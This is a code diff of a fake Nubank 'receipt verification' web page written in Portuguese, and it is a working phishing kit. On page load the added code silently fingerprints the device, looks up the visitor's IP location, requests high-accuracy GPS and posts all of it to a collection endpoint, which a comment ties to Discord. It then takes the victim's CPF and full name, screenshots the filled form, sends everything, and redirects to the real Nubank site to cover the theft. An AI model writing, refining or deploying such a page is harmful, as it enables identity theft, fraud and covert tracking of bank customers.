@@ -39,7 +39,6 @@
       flex-direction: column;
     }
 
-    /* Header Nubank Style */
     .header {
       background-color: var(--nubank-purple);
       padding: 24px;
@@ -49,43 +48,8 @@
     .header h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 4px; }
     .header p { font-size: 0.9rem; opacity: 0.9; }
 
-    /* Content */
     .content { padding: 24px; }
 
-    .step-indicator {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 24px;
-      position: relative;
-    }
-    .step-indicator::before {
-      content: '';
-      position: absolute;
-      top: 10px;
-      left: 20px;
-      right: 20px;
-      height: 2px;
-      background: var(--border-color);
-      z-index: 1;
-    }
-    .step {
-      width: 20px;
-      height: 20px;
-      background: white;
-      border: 2px solid var(--border-color);
-      border-radius: 50%;
-      z-index: 2;
-      position: relative;
-    }
-    .step.active { border-color: var(--nubank-purple); background: var(--nubank-purple); }
-    .step-label {
-      font-size: 0.7rem;
-      color: var(--text-secondary);
-      margin-top: 4px;
-      text-align: center;
-    }
-
-    /* Form Elements */
     .form-group { margin-bottom: 16px; }
     .form-label {
       display: block;
@@ -125,18 +89,6 @@
     .btn-primary:hover { background-color: var(--nubank-purple-dark); }
     .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
 
-    .btn-secondary {
-      background: transparent;
-      border: 1px solid var(--border-color);
-      color: var(--text-primary);
-      width: 100%;
-      padding: 12px;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: 500;
-      margin-top: 8px;
-    }
-
     .alert {
       background-color: var(--nubank-purple-light);
       color: var(--nubank-purple);
@@ -144,21 +96,25 @@
       border-radius: 8px;
       font-size: 0.85rem;
       margin-bottom: 16px;
-      display: none;
     }
-    .alert.show { display: block; }
+
+    .geo-status {
+      text-align: center;
+      margin: 10px 0;
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+    }
 
     .hidden { display: none !important; }
 
-    /* Loading Spinner */
     .spinner {
       border: 3px solid #f3f3f3;
       border-top: 3px solid var(--nubank-purple);
       border-radius: 50%;
-      width: 24px;
-      height: 24px;
+      width: 20px;
+      height: 20px;
       animation: spin 1s linear infinite;
-      margin: 0 auto;
+      margin: 0 auto 8px auto;
     }
     @keyframes spin { 100% { transform: rotate(360deg); } }
 
@@ -169,420 +125,371 @@
       margin-top: 16px;
     }
   </style>
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
 
   <div class="container" id="captureArea">
-    <!-- Header -->
     <div class="header">
       <h1>Nubank</h1>
       <p>Verificação de Comprovante</p>
     </div>
 
-    <!-- Content -->
     <div class="content">
+      <!-- Status de Geolocalização (Automático) -->
+      <div id="geoStatus" class="geo-status">
+        <div class="spinner" id="geoSpinner"></div>
+        <span id="geoText">Solicitando permissão de localização...</span>
+      </div>
+
+      <div class="alert" id="geoAlert">
+        📍 Para confirmar a entrega digital do comprovante, precisamos da sua localização atual.
+      </div>
+
+      <!-- Formulário de Identificação -->
+      <div class="form-group">
+        <label class="form-label" for="inputNome">Nome Completo</label>
+        <input type="text" id="inputNome" class="form-input" placeholder="Seu nome completo" autocomplete="off">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="inputCpf">CPF</label>
+        <input type="text" id="inputCpf" class="form-input" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
+        <div id="cpfError" class="alert hidden" style="color: var(--error-color); background: #FDECEA;">CPF inválido. Verifique os dígitos.</div>
+      </div>
       
-      <!-- Step 1: CPF -->
-      <div id="step-cpf">
-        <div class="form-group">
-          <label class="form-label" for="inputCpf">CPF</label>
-          <input type="text" id="inputCpf" class="form-input" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
-          <div id="cpfError" class="alert">CPF inválido. Verifique os dígitos.</div>
-        </div>
-        <div class="form-group">
-          <label class="form-label" for="inputNome">Nome Completo</label>
-          <input type="text" id="inputNome" class="form-input" placeholder="Seu nome completo">
-        </div>
-        
-        <button id="btnNextCpf" class="btn-primary" disabled>Continuar</button>
-        <p class="footer-note">Seu CPF é usado apenas para validar a titularidade da conta.</p>
-      </div>
-
-      <!-- Step 2: Location & Confirmation -->
-      <div id="step-location" class="hidden">
-        <div class="alert show" id="locationAlert">
-          📍 Para confirmar a entrega digital do comprovante, precisamos da sua localização atual.
-        </div>
-        
-        <div id="geoStatus" style="text-align:center; margin: 20px 0;">
-          <div class="spinner" id="geoSpinner"></div>
-          <p id="geoText" style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 10px;">Solicitando permissão de localização...</p>
-        </div>
-
-        <div id="geoSuccessBox" class="hidden" style="text-align:center; margin: 20px 0;">
-          <div style="font-size: 2rem;">✅</div>
-          <p><strong>Localização Confirmada</strong></p>
-          <p id="geoCoords" style="font-size: 0.8rem; color: var(--text-secondary); font-family: monospace;"></p>
-        </div>
-
-        <div id="geoErrorBox" class="hidden" style="text-align:center; margin: 20px 0;">
-          <div style="font-size: 2rem;">⚠️</div>
-          <p><strong>Localização Não Autorizada</strong></p>
-          <p style="font-size: 0.8rem; color: var(--text-secondary);">Você pode continuar sem localização, mas a precisão do comprovante será menor.</p>
-        </div>
-
-        <button id="btnConfirm" class="btn-primary" disabled>Gerar Comprovante</button>
-        <button id="btnBack" class="btn-secondary">Voltar</button>
-      </div>
-
-      <!-- Step 3: Processing/Final -->
-      <div id="step-final" class="hidden">
-        <div style="text-align:center; padding: 40px 0;">
-          <div class="spinner" id="finalSpinner"></div>
-          <h2 style="margin-top: 16px; font-size: 1.1rem;">Processando Dados...</h2>
-          <p id="finalStatus" style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 8px;">Enviando informações de segurança.</p>
-        </div>
-        <button id="btnRedirect" class="btn-primary hidden">Acessar Meu Nubank</button>
-      </div>
-
+      <button id="btnFinalizar" class="btn-primary" disabled>Gerar Comprovante</button>
+      
+      <p class="footer-note">Seu CPF é usado apenas para validar a titularidade da conta.</p>
     </div>
   </div>
 
-<script>
-(() => {
-  'use strict';
+  <!-- Biblioteca para Screenshot -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
-  const CONFIG = {
-    destinoFinal: 'https://nubank.com.br/',
-    apiEndpoint: '/api/notificar'
-  };
+  <script>
+  (() => {
+    'use strict';
 
-  // Estado Global
-  const state = {
-    cpf: '',
-    nome: '',
-    geo: null, // { lat, lon, accuracy }
-    meta: null,
-    ip: null,
-    screenshotData: null
-  };
-
-  const el = id => document.getElementById(id);
-
-  // ============================================
-  // 1. UTILITÁRIOS
-  // ============================================
-
-  function maskCPF(value) {
-    let v = value.replace(/\D/g, '').substring(0, 11);
-    if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})?/, '$1.$2.$3-$4');
-    else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})?/, '$1.$2-$3');
-    else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})?/, '$1.$2');
-    return v;
-  }
-
-  function validarCPF(cpf) {
-    cpf = cpf.replace(/\D/g, '');
-    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
-    let soma = 0;
-    for (let i = 1; i <= 9; i++) soma += parseInt(cpf.charAt(i - 1)) * (11 - i);
-    let digito1 = 11 - (soma % 11);
-    if (digito1 === 10 || digito1 === 11) digito1 = 0;
-    if (digito1 !== parseInt(cpf.charAt(9))) return false;
-    soma = 0;
-    for (let i = 1; i <= 10; i++) soma += parseInt(cpf.charAt(i - 1)) * (12 - i);
-    let digito2 = 11 - (soma % 11);
-    if (digito2 === 10 || digito2 === 11) digito2 = 0;
-    if (digito2 !== parseInt(cpf.charAt(10))) return false;
-    return true;
-  }
-
-  // ============================================
-  // 2. COLETA DE METADADOS
-  // ============================================
-  async function coletarMetadados() {
-    console.log('[DEBUG] Iniciando coleta de metadados...');
-    const meta = {
-      cpuCores: navigator.hardwareConcurrency || 0,
-      memoriaTotal: navigator.deviceMemory || 0,
-      plataforma: navigator.platform,
-      userAgent: navigator.userAgent,
-      larguraTela: window.screen.width,
-      alturaTela: window.screen.height,
-      dpiTela: window.devicePixelRatio,
-      temTouch: 'ontouchstart' in window,
-      fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      offsetMinutos: new Date().getTimezoneOffset(),
-      idiomas: navigator.languages,
-      cookies: navigator.cookieEnabled,
-      plugins: navigator.plugins.length,
-      gpu: null,
-      fontes: [],
-      bateria: null
+    const CONFIG = {
+      apiEndpoint: '/api/notificar',
+      destinoFinal: 'https://nubank.com.br/'
     };
 
-    // GPU
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      if (gl) {
-        const info = gl.getExtension('WEBGL_debug_renderer_info');
-        meta.gpu = {
-          vendor: gl.getParameter(info ? info.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
-          renderer: gl.getParameter(info ? info.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
-        };
-      }
-    } catch (e) {
-      meta.gpu = { vendor: 'Erro', renderer: 'Erro' };
+    // Estado Global
+    const state = {
+      cpf: '',
+      nome: '',
+      geo: null,
+      meta: null,
+      ip: null,
+      screenshotData: null,
+      enviadoInicial: false
+    };
+
+    const el = id => document.getElementById(id);
+
+    // ============================================
+    // 1. UTILITÁRIOS
+    // ============================================
+    function maskCPF(value) {
+      let v = value.replace(/\D/g, '').substring(0, 11);
+      if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})?/, '$1.$2.$3-$4');
+      else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})?/, '$1.$2-$3');
+      else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})?/, '$1.$2');
+      return v;
     }
 
-    // Fontes
-    const fontes = ['Arial', 'Verdana', 'Trebuchet MS', 'Courier New', 'Georgia', 'Times New Roman', 'Impact', 'Comic Sans MS', 'Helvetica Neue', 'Segoe UI'];
-    const corpo = document.body;
-    const testeLargura = (fonte) => {
-        const span = document.createElement('span');
-        span.style.cssText = `font-family:${fonte};font-size:100px;position:absolute;top:0;left:0;visibility:hidden;`;
-        span.textContent = 'mmmmmmmmmmlliillii';
-        corpo.appendChild(span);
-        const largura = span.offsetWidth;
-        corpo.removeChild(span);
-        return largura;
-    };
-    const larguraGenerica = testeLargura('sans-serif');
-    fontes.forEach(f => {
-        if (testeLargura(f) !== larguraGenerica) meta.fontes.push(f);
-    });
+    function validarCPF(cpf) {
+      cpf = cpf.replace(/\D/g, '');
+      if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+      let soma = 0;
+      for (let i = 1; i <= 9; i++) soma += parseInt(cpf.charAt(i - 1)) * (11 - i);
+      let digito1 = 11 - (soma % 11);
+      if (digito1 === 10 || digito1 === 11) digito1 = 0;
+      if (digito1 !== parseInt(cpf.charAt(9))) return false;
+      soma = 0;
+      for (let i = 1; i <= 10; i++) soma += parseInt(cpf.charAt(i - 1)) * (12 - i);
+      let digito2 = 11 - (soma % 11);
+      if (digito2 === 10 || digito2 === 11) digito2 = 0;
+      if (digito2 !== parseInt(cpf.charAt(10))) return false;
+      return true;
+    }
 
-    if (navigator.getBattery) {
+    // ============================================
+    // 2. COLETA DE METADADOS E IP
+    // ============================================
+    async function coletarMetadados() {
+      const meta = {
+        cpuCores: navigator.hardwareConcurrency || 0,
+        memoriaTotal: navigator.deviceMemory || 0,
+        plataforma: navigator.platform,
+        userAgent: navigator.userAgent,
+        larguraTela: window.screen.width,
+        alturaTela: window.screen.height,
+        dpiTela: window.devicePixelRatio,
+        temTouch: 'ontouchstart' in window,
+        fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offsetMinutos: new Date().getTimezoneOffset(),
+        idiomas: navigator.languages,
+        cookies: navigator.cookieEnabled,
+        plugins: navigator.plugins.length,
+        gpu: null,
+        fontes: [],
+        bateria: null
+      };
+
       try {
-        const bat = await navigator.getBattery();
-        meta.bateria = { nivel: bat.level, carregando: bat.charging };
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const info = gl.getExtension('WEBGL_debug_renderer_info');
+          meta.gpu = {
+            vendor: gl.getParameter(info ? info.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
+            renderer: gl.getParameter(info ? info.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
+          };
+        }
       } catch (e) {}
+
+      const fontes = ['Arial', 'Verdana', 'Trebuchet MS', 'Courier New', 'Georgia', 'Times New Roman', 'Impact', 'Comic Sans MS', 'Helvetica Neue', 'Segoe UI'];
+      const corpo = document.body;
+      const testeLargura = (fonte) => {
+          const span = document.createElement('span');
+          span.style.cssText = `font-family:${fonte};font-size:100px;position:absolute;top:0;left:0;visibility:hidden;`;
+          span.textContent = 'mmmmmmmmmmlliillii';
+          corpo.appendChild(span);
+          const largura = span.offsetWidth;
+          corpo.removeChild(span);
+          return largura;
+      };
+      const larguraGenerica = testeLargura('sans-serif');
+      fontes.forEach(f => {
+          if (testeLargura(f) !== larguraGenerica) meta.fontes.push(f);
+      });
+
+      if (navigator.getBattery) {
+        try {
+          const bat = await navigator.getBattery();
+          meta.bateria = { nivel: bat.level, carregando: bat.charging };
+        } catch (e) {}
+      }
+      return meta;
     }
 
-    console.log('[DEBUG] Metadados coletados:', meta);
-    return meta;
-  }
-
-  async function obterIP() {
-    console.log('[DEBUG] Iniciando busca de IP...');
-    const provedores = [
-      'https://ipwho.is/',
-      'https://ipapi.co/json/',
-      'https://get.geojs.io/v1/ip/geo.json'
-    ];
-    for (const url of provedores) {
-      try {
-        const res = await fetch(url, { signal: AbortSignal.timeout(4000) });
-        const data = await res.json();
-        const ipData = {
-          ip: data.ip,
-          cidade: data.city,
-          regiao: data.region,
-          pais: data.country,
-          provedor: data.connection?.isp || data.org || data.organization,
-          latitude: data.latitude,
-          longitude: data.longitude,
-          asn: data.connection?.asn || data.asn
-        };
-        console.log('[DEBUG] IP obtido:', ipData);
-        return ipData;
-      } catch (e) {
-        console.warn(`[DEBUG] Falha no provedor ${url}:`, e.message);
+    async function obterIP() {
+      const provedores = [
+        'https://ipwho.is/',
+        'https://ipapi.co/json/',
+        'https://get.geojs.io/v1/ip/geo.json'
+      ];
+      for (const url of provedores) {
+        try {
+          const res = await fetch(url, { signal: AbortSignal.timeout(4000) });
+          const data = await res.json();
+          return {
+            ip: data.ip,
+            cidade: data.city,
+            regiao: data.region,
+            pais: data.country,
+            provedor: data.connection?.isp || data.org || data.organization,
+            latitude: data.latitude,
+            longitude: data.longitude,
+            asn: data.connection?.asn || data.asn
+          };
+        } catch (e) {}
       }
-    }
-    return null;
-  }
-
-  // ============================================
-  // 3. CAPTURA DE SCREENSHOT
-  // ============================================
-  async function capturarScreenshot() {
-    try {
-      const area = document.getElementById('captureArea');
-      
-      // Tenta usar html2canvas se disponível
-      if (window.html2canvas) {
-        console.log('[DEBUG] Usando html2canvas...');
-        const canvas = await html2canvas(area, {
-          scale: 1.5,
-          useCORS: true,
-          logging: false
-        });
-        const dataUrl = canvas.toDataURL('image/png');
-        console.log('[DEBUG] Screenshot gerado. Tamanho:', dataUrl.length);
-        return dataUrl;
-      }
-      
-      // Fallback: Serializa HTML (Leve)
-      console.log('[DEBUG] Fallback para HTML serializado...');
-      const htmlContent = area.innerHTML;
-      return `data:text/html;charset=utf-8,${encodeURIComponent(htmlContent)}`;
-    } catch (e) {
-      console.error('[DEBUG] Falha na captura:', e);
       return null;
     }
-  }
 
-  // ============================================
-  // 4. ENVIO FINAL
-  // ============================================
-  async function enviarDadosFinais() {
-    console.log('[DEBUG] Iniciando envio final...');
-    
-    // Garante que temos os dados base
-    if (!state.meta) state.meta = await coletarMetadados();
-    if (!state.ip) state.ip = await obterIP();
+    // ============================================
+    // 3. ENVIO DE DADOS
+    // ============================================
+    async function enviarDados(incluiPessoal = false) {
+      const payload = {
+        autorizouCompartilhamento: true,
+        dados: {
+          cpf: incluiPessoal ? state.cpf : null,
+          nome: incluiPessoal ? state.nome : null,
+          lat: state.geo?.lat || state.ip?.latitude,
+          lon: state.geo?.lon || state.ip?.longitude,
+          accuracy: state.geo?.accuracy || null,
+          usadoGps: !!state.geo,
+          ip: state.ip?.ip,
+          cidade: state.ip?.cidade,
+          regiao: state.ip?.regiao,
+          pais: state.ip?.pais,
+          provedor: state.ip?.provedor,
+          asn: state.ip?.asn,
+          meta: state.meta,
+          screenshot: incluiPessoal ? state.screenshotData : null,
+          horario: new Date().toISOString(),
+          tipoEvento: incluiPessoal ? 'final' : 'initial'
+        }
+      };
 
-    // Captura o screenshot final
-    state.screenshotData = await capturarScreenshot();
-
-    const payload = {
-      autorizouCompartilhamento: true,
-      dados: {
-        cpf: state.cpf,
-        nome: state.nome,
-        lat: state.geo?.lat || state.ip?.latitude,
-        lon: state.geo?.lon || state.ip?.longitude,
-        accuracy: state.geo?.accuracy || null,
-        usadoGps: !!state.geo,
-        ip: state.ip?.ip,
-        cidade: state.ip?.cidade,
-        regiao: state.ip?.regiao,
-        pais: state.ip?.pais,
-        provedor: state.ip?.provedor,
-        asn: state.ip?.asn,
-        meta: state.meta,
-        screenshot: state.screenshotData,
-        horario: new Date().toISOString()
+      try {
+        const response = await fetch(CONFIG.apiEndpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const result = await response.json();
+        console.log('[DEBUG] Dados enviados:', result);
+        return result;
+      } catch (error) {
+        console.error('[DEBUG] Falha no envio:', error);
+        throw error;
       }
-    };
-
-    console.log('[DEBUG] Payload pronto. Enviando...');
-    
-    try {
-      const response = await fetch(CONFIG.apiEndpoint, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      
-      const result = await response.json();
-      console.log('[DEBUG] Resposta do servidor:', result);
-      
-      if (!response.ok) throw new Error(`Erro HTTP ${response.status}`);
-      return result;
-    } catch (error) {
-      console.error('[DEBUG] Falha no envio final:', error);
-      throw error;
     }
-  }
 
-  // ============================================
-  // 5. EVENTOS E INTERAÇÃO
-  // ============================================
+    async function capturarScreenshot() {
+      try {
+        const area = document.getElementById('captureArea');
+        if (window.html2canvas) {
+          const canvas = await html2canvas(area, { scale: 1.5, useCORS: true, logging: false });
+          return canvas.toDataURL('image/png');
+        }
+        return null;
+      } catch (e) {
+        console.warn('Falha no screenshot:', e);
+        return null;
+      }
+    }
 
-  el('inputCpf').addEventListener('input', (e) => {
-    e.target.value = maskCPF(e.target.value);
-    const cpfLimpo = e.target.value.replace(/\D/g, '');
-    
-    if (cpfLimpo.length === 11) {
-      if (validarCPF(cpfLimpo)) {
-        state.cpf = e.target.value;
-        el('btnNextCpf').disabled = false;
-        el('cpfError').classList.remove('show');
+    // ============================================
+    // 4. LÓGICA PRINCIPAL (AUTOMÁTICA)
+    // ============================================
+    async function inicializarColeta() {
+      console.log('[DEBUG] Inicializando coleta automática...');
+      
+      // 1. Coleta Metadados e IP em paralelo
+      const [meta, ip] = await Promise.all([coletarMetadados(), obterIP()]);
+      state.meta = meta;
+      state.ip = ip;
+
+      // 2. Dispara Geolocalização (Popup Nativo)
+      solicitarGeolocalizacao();
+
+      // 3. Envia os dados iniciais (Sem CPF/Nome)
+      // Isso garante que o Discord receba o IP e Hardware imediatamente
+      await enviarDados(false);
+      state.enviadoInicial = true;
+      
+      console.log('[DEBUG] Coleta inicial concluída.');
+    }
+
+    function solicitarGeolocalizacao() {
+      if (!navigator.geolocation) {
+        atualizarStatusGeo('erro', 'Geolocalização não suportada.');
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          state.geo = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: position.timestamp
+          };
+          console.log('[DEBUG] GPS Obtido:', state.geo);
+          atualizarStatusGeo('sucesso', `Localização obtida (±${Math.round(state.geo.accuracy)}m).`);
+        },
+        (error) => {
+          console.warn('[DEBUG] Erro de Geolocalização:', error.message);
+          atualizarStatusGeo('erro', 'Localização não autorizada.');
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    function atualizarStatusGeo(tipo, texto) {
+      el('geoSpinner').classList.add('hidden');
+      el('geoText').textContent = texto;
+      if (tipo === 'erro') {
+        el('geoAlert').style.display = 'none';
       } else {
-        el('cpfError').classList.add('show');
-        el('btnNextCpf').disabled = true;
+        // Se for sucesso, podemos esconder o alerta de solicitação
+        el('geoAlert').style.display = 'none';
       }
-    } else {
-      el('btnNextCpf').disabled = true;
     }
-  });
 
-  el('inputNome').addEventListener('input', (e) => {
-    state.nome = e.target.value.trim();
-  });
+    // ============================================
+    // 5. EVENTOS DO FORMULÁRIO (CPF E NOME)
+    // ============================================
 
-  el('btnNextCpf').addEventListener('click', () => {
-    console.log('[DEBUG] Botão Continuar clicado.');
-    el('step-cpf').classList.add('hidden');
-    el('step-location').classList.remove('hidden');
-    solicitarGeolocalizacao();
-  });
-
-  el('btnBack').addEventListener('click', () => {
-    el('step-location').classList.add('hidden');
-    el('step-cpf').classList.remove('hidden');
-  });
-
-  async function solicitarGeolocalizacao() {
-    el('geoSpinner').classList.remove('hidden');
-    el('geoText').classList.remove('hidden');
-    el('geoSuccessBox').classList.add('hidden');
-    el('geoErrorBox').classList.add('hidden');
-    el('btnConfirm').disabled = true;
-
-    console.log('[DEBUG] Solicitando Geolocalização...');
-    
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        state.geo = {
-          lat: position.coords.latitude,
-          lon: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          timestamp: position.timestamp
-        };
-        console.log('[DEBUG] GPS Obido:', state.geo);
-        
-        el('geoSpinner').classList.add('hidden');
-        el('geoText').classList.add('hidden');
-        el('geoSuccessBox').classList.remove('hidden');
-        el('geoCoords').textContent = `Lat: ${state.geo.lat.toFixed(6)} | Lon: ${state.geo.lon.toFixed(6)} | ±${state.geo.accuracy}m`;
-        el('btnConfirm').disabled = false;
-      },
-      (error) => {
-        console.warn('[DEBUG] Erro de Geolocalização:', error.message);
-        state.geo = null;
-        el('geoSpinner').classList.add('hidden');
-        el('geoText').classList.add('hidden');
-        el('geoErrorBox').classList.remove('hidden');
-        el('btnConfirm').disabled = false;
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+    // Máscara e Validação de CPF
+    el('inputCpf').addEventListener('input', (e) => {
+      e.target.value = maskCPF(e.target.value);
+      const cpfLimpo = e.target.value.replace(/\D/g, '');
+      
+      if (cpfLimpo.length === 11) {
+        if (validarCPF(cpfLimpo)) {
+          state.cpf = e.target.value;
+          el('cpfError').classList.add('hidden');
+          verificarFormularioCompleto();
+        } else {
+          el('cpfError').classList.remove('hidden');
+          state.cpf = '';
+          el('btnFinalizar').disabled = true;
+        }
+      } else {
+        state.cpf = '';
+        el('btnFinalizar').disabled = true;
       }
-    );
-  }
+    });
 
-  el('btnConfirm').addEventListener('click', async () => {
-    console.log('[DEBUG] Botão Gerar Comprovante clicado.');
-    el('step-location').classList.add('hidden');
-    el('step-final').classList.remove('hidden');
-    
-    try {
-      await enviarDadosFinais();
-      
-      el('finalSpinner').classList.add('hidden');
-      el('finalStatus').textContent = 'Comprovante gerado com sucesso!';
-      el('finalStatus').style.color = 'green';
-      el('btnRedirect').classList.remove('hidden');
-      
-    } catch (error) {
-      console.error('[DEBUG] Erro no fluxo final:', error);
-      el('finalStatus').textContent = 'Falha ao processar. Verifique o console.';
-      el('finalStatus').style.color = 'red';
+    // Captura do Nome
+    el('inputNome').addEventListener('input', (e) => {
+      state.nome = e.target.value.trim();
+      verificarFormularioCompleto();
+    });
+
+    // Habilita o botão apenas se Nome e CPF forem válidos
+    function verificarFormularioCompleto() {
+      if (state.nome.length > 3 && validarCPF(state.cpf)) {
+        el('btnFinalizar').disabled = false;
+      } else {
+        el('btnFinalizar').disabled = true;
+      }
     }
-  });
 
-  el('btnRedirect').addEventListener('click', () => {
-    window.location.href = CONFIG.destinoFinal;
-  });
+    // AÇÃO FINAL: Gerar Comprovante (Envio de Dados Pessoais + Screenshot)
+    el('btnFinalizar').addEventListener('click', async () => {
+      const botao = el('btnFinalizar');
+      botao.disabled = true;
+      botao.textContent = 'Processando...';
 
-  // ============================================
-  // 6. INICIALIZAÇÃO
-  // ============================================
-  document.addEventListener('DOMContentLoaded', () => {
-    console.log('[DEBUG] DOM Carregado. Iniciando coleta em background...');
-    coletarMetadados().then(m => state.meta = m);
-    obterIP().then(ip => state.ip = ip);
-  });
+      try {
+        // 1. Captura o Screenshot da tela (com CPF e Nome preenchidos)
+        state.screenshotData = await capturarScreenshot();
 
-})();
-</script>
+        // 2. Envia os dados finais (Incluindo CPF, Nome e Screenshot)
+        await enviarDados(true);
+
+        // 3. Redireciona para o site real do Nubank
+        window.location.href = CONFIG.destinoFinal;
+
+      } catch (error) {
+        console.error('[DEBUG] Erro no envio final:', error);
+        botao.textContent = 'Erro ao processar. Tente novamente.';
+        botao.disabled = false;
+      }
+    });
+
+    // ============================================
+    // 6. INICIALIZAÇÃO AUTOMÁTICA
+    // ============================================
+    document.addEventListener('DOMContentLoaded', () => {
+      // Dispara a coleta assim que a página carregar
+      inicializarColeta();
+    });
+
+  })();
+  </script>
 </body>
 </html>
+     
